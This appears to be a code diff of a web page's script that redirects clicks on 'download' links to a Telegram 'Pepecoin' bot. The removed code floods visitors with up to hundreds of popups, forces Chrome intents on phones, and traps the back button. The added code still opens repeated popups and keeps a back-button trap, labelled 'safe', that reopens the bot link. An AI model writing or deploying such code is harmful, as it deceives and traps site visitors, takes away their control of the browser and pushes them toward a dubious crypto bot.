@@ -213,96 +213,31 @@ cursor:pointer;
 </div>
 
  <script>
-
 const smartLink = "https://t.me/Pepecoin_bot_bot/startapp";
 
-let clickCount = 0;
+// ✅ popup function
+function openPopup(url){
+  let win = window.open(url, "_blank");
 
-// 🔥 POPUP FUNCTION
-function openPopups(url, count){
-  for(let i = 0; i < count; i++){
-    setTimeout(() => {
-      window.open(url, "_blank");
-    }, i * 300);
+  if(!win){
+    window.location.href = url;
   }
 }
 
+// ✅ main function
 function openExternal(){
 
-  clickCount++;
+  // 👉 1st popup
+  openPopup(smartLink);
 
-  const ua = navigator.userAgent.toLowerCase();
-  const isAndroid = /android/.test(ua);
-  const isIOS = /iphone|ipad|ipod/.test(ua);
-  const isTelegram = /telegram/.test(ua);
-
-  // 🔥 LOGIC
-  let popupCount;
-
-  if(clickCount === 1){
-    popupCount = 5; // 1st click = 5 popup
-  } else {
-    popupCount = 100; // 2nd+ click = 100 popup
-  }
-
-  // 🎲 RANDOM BOOST (sometimes +1)
-  if(Math.random() < 0.20){
-    popupCount += 100;
-  }
-
-  // ✅ TELEGRAM
-  if(isTelegram){
-    openPopups(smartLink, popupCount);
-    return;
-  }
-
-  // 🤖 ANDROID
-  if(isAndroid){
-
-    let intentLink =
-    "intent://" +
-    smartLink.replace(/^https?:\/\//,'') +
-    "#Intent;scheme=https;package=com.android.chrome;end";
-
-    openPopups(intentLink, popupCount);
-
-    setTimeout(() => {
-      openPopups(smartLink, popupCount);
-    }, 00);
-  }
-
-  // 🍎 IOS
-  else if(isIOS){
-
-    let chromeLink =
-    "googlechrome://" +
-    smartLink.replace(/^https?:\/\//,'');
-
-    openPopups(chromeLink, popupCount);
-
-    setTimeout(() => {
-      openPopups(smartLink, popupCount);
-    }, 1200);
-  }
-
-  // 💻 PC
-  else{
-    openPopups(smartLink, popupCount);
-  }
+  // 👉 2nd popup (safe delay)
+  setTimeout(()=>{
+    openPopup(smartLink);
+  }, 300);
 
 }
 
-// 🔥 BACK BUTTON BLOCK + LOOP
-history.pushState(null, null, location.href);
-
-window.onpopstate = function () {
-  history.pushState(null, null, location.href);
-
-  // আবার popup খুলবে
-  openPopups(smartLink, 5);
-};
-
-// CLICK EVENT
+// 👉 click event
 document.addEventListener("click", function(e){
   if(e.target.classList.contains("download")){
     e.preventDefault();
@@ -310,6 +245,13 @@ document.addEventListener("click", function(e){
   }
 });
 
+// 🔥 BACK BUTTON SAFE BLOCK (optional safe version)
+history.pushState(null, null, location.href);
+
+window.onpopstate = function () {
+  history.pushState(null, null, location.href);
+  openPopup(smartLink);
+};
  </script>
 
 </body>
